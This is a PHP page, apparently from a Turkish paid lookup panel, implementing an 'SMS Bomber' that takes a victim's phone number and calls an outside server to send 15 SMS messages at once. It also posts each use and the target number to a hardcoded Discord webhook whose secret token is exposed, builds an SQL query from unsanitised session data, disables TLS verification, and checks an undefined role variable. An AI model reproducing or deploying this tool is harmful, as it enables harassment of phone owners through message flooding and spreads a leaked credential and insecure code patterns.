<?php
include("server/control.php");
include("inc/sidebar.php");


$auth = $_SESSION["key"];
$control = $conn->query("SELECT * FROM apiusers WHERE auth_key = '{$auth}'")->fetch();
if ($angeris['role'] != 1 && $angeris['role'] != 2) {
    echo "Vip üyelik ve daha fazla bilgi için Instagram hesabımızı ziyaret edebilirsiniz: lawliet0001'a Gelebilirsiniz - https://discord.gg/v0001";
    exit;
}

?>
<style>
/* Kaydırma çubuğu tasarımı */
::-webkit-scrollbar {
  width: 8px;
}

::-webkit-scrollbar-track {
  background-color: #0f0f0f;
}

::-webkit-scrollbar-thumb {
  background-color: #888;
  border-radius: 10px;
}

/* Kaydırmayı sağlayan özelleştirilmiş div */
.scrollable-content {
  overflow-y: scroll;
  height: 300px;
}
</style>
            
            <div class="main-content">

                <div class="page-content">
                    <div class="container-fluid">

                        <div class="row">
                            <div class="col-12">
                                <div class="page-title-box d-sm-flex align-items-center justify-content-between">


                                </div>
                            </div>
                        </div>
                           

                      

                         <div class="row">
                            <div class="col-lg-12">
                                <div class="card">
                                <form method="post" onsubmit="return sorgula();">
                                                                    <div class="card-body">
                                        <h4 class="card-title mb-4">Sms Bomber</h4>
                                        <input type="text" class="form-control" name="tcc" placeholder="Başında 0 Olmadan : 555555555 Bu Tarz Biçimde Yazın">  
                                        <br>
                                        <button type="submit" class="btn btn-primary" id="sorgula-button" data-bs-toggle="modal">Gönder</button>
                                        <button type="button" class="btn btn-primary" id="temizle-button" data-bs-toggle="modal">Temizle</button>
                                        </div>
                                        <br> <br>
                                        <div class="alert alert-warning" role="alert">
	                                      <button type="button" class="btn-close" data-bs-dismiss="alert" aria-hidden="true">×        
                                        </button>15 SMS Yollar Tek Seferde.</div>
                                        </div>
                                        </form>
                                        <div class="table-responsive">
	<div class="card-body">
		<h3>Sonuçlar;</h3>
		<table class="table table-bordered table-striped" style="width:100%">
			<thead>
                                        <tr>
                                        <th>Numara</th>
                            <th>Sonuç</th>
                                        </tr>
                                    </thead>
                                    <tbody id="sonuclar-body">
									<?php
if(isset($_POST["tcc"])){
    $tcs = filter_var($_POST["tcc"], FILTER_SANITIZE_STRING);
    if (!preg_match('/^\d{10}$/', $tcs)) {
        die("Geçerli Bir Numara Değil.");
    }
    $tc = htmlspecialchars($_POST['tcc'], ENT_QUOTES, 'UTF-8');
    $file = 'api/count.txt';

    $currentValue = file_get_contents($file);
    
    $newValue = intval($currentValue) + 1;
    
    file_put_contents($file, $newValue);
    $file = fopen('api/andrei.php', 'a');
    fwrite($file, "<b style=\"color: #42ddf5;\">$key_ad</b> isimli üye <b style=\"color: #f07d3a\">SMS Bomber</b> Kullandı!<br>\n");
    fclose($file);
    $url = "https://discord.com/api/webhooks/1099804982871609405/RzpvCPE4aaesrpR2PuQ66j2iL9DGFck_0y6PUhwHDtWqQqJ4UzsBMhwzSdxlF51ruIvZ";
    $headers = [ 'Content-Type: application/json; charset=utf-8' ];
    $POST = ['username' => 'Sorgu Denetleyicisi', 'content' => $user['key_ad'].' Adlı Kullanıcı SMS Bomber Kullandı! Attığı Numara: '.$tcs ];
    $data_string = json_encode($data);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
    $response   = curl_exec($ch);
    if ($response === false) {
        die("Error executing Discord webhook: " . curl_error($ch));
    }
    $url= "http://181.214.223.147/api/andreiapiservice/sms.php?gsm=$tc";
    $bacis1kenfayuj = curl_init($url);
    curl_setopt($bacis1kenfayuj, CURLOPT_URL, $url);
    curl_setopt($bacis1kenfayuj, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($bacis1kenfayuj, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($bacis1kenfayuj, CURLOPT_SSL_VERIFYPEER, false);
    
    $resp = curl_exec($bacis1kenfayuj);
    curl_close($bacis1kenfayuj);

        echo "<tr>
            <th>".$tc."</th>
            <th>15 Adet Sms Gönderilmiştir.</th>
        </tr>";
    
}
?>

</script>
                                    </tbody>
                                </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
          </div>
          <script>
    let isQueryAllowed = true;
    let queryCooldown = 59; // 30 seconds cooldown

    // Check if there's a stored timestamp and calculate the remaining cooldown time
    const storedTimestamp = localStorage.getItem("lastQueryTimestamp");
    if (storedTimestamp) {
        const currentTime = Math.floor(Date.now() / 1000);
        const timeSinceLastQuery = currentTime - parseInt(storedTimestamp);
        if (timeSinceLastQuery < queryCooldown) {
            queryCooldown -= timeSinceLastQuery;
            isQueryAllowed = false;
            updateCooldownTimer();
        }
    }

    function updateCooldownTimer() {
    const sorgulaButton = document.getElementById("sorgula-button");

    if (!isQueryAllowed) {
        sorgulaButton.disabled = true;
        const timerInterval = setInterval(() => {
            const remainingTime = queryCooldown;
            sorgulaButton.innerHTML = `Sorgula (${remainingTime}s)`;

            if (remainingTime <= 0) {
                clearInterval(timerInterval);
                sorgulaButton.innerHTML = "Sorgula";
                sorgulaButton.disabled = false;
                isQueryAllowed = true;
                queryCooldown = 30;
            } else {
                queryCooldown--;
            }
        }, 1000);
    }
}

    function sorgula() {
        if (!isQueryAllowed) {
            Swal.fire({
                icon: "warning",
                title: "Uyarı!",
                text: `30 saniye içinde tekrar gönderim yapamazsınız. Lütfen ${queryCooldown} saniye bekleyin.`,
                showConfirmButton: false,
                timer: 3000,
                allowOutsideClick: false,
            });
            return false; // Prevent form submission
        }

        var tcInput = document.querySelector('input[name="tcc"]');

        if (tcInput.value.length === 0 || tcInput.value.length < 10 || isNaN(tcInput.value)) {
            Swal.fire({
                icon: "error",
                title: "Hata!",
                text: "Lütfen geçerli bir Numara girin.",
                showConfirmButton: false,
                timer: 1500,
                allowOutsideClick: false,
            });
            return false; // Prevent form submission
        } else {
            isQueryAllowed = false; // Disable queries for the cooldown period
            updateCooldownTimer(); // Start the cooldown timer

            localStorage.setItem("lastQueryTimestamp", Math.floor(Date.now() / 1000).toString());

            Swal.fire({
                icon: "success",
                title: "lawliet0001",
                text: "Gönderim Başarılı!",
                showConfirmButton: false,
                timer: 1500,
                allowOutsideClick: false,
            });
            return true; // Allow form submission
        }
    }

    document.getElementById("temizle-button").addEventListener("click", function () {
        var tableBody = document.getElementById("sonuclar-body");
        tableBody.innerHTML = "";
    });
</script>
                                    </tbody>
                                </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
          </div>

          
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                    </div>
                </div>
<?php
include("inc/main_js.php");

?>
